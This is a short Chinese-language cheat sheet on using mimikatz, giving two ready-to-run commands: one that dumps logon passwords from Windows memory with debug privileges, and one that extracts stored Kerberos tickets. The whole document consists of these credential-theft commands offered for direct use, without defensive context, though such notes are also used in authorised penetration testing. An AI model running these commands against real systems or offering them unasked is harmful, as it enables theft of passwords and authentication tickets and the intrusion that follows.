# mimikatz使用

1. 通用密码提取（需要高权限）

```clike
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

1. 提取存在票据

```bash
.\mimikatz.exe "privilege::debug" "sekurlsa::tickets" exit
```
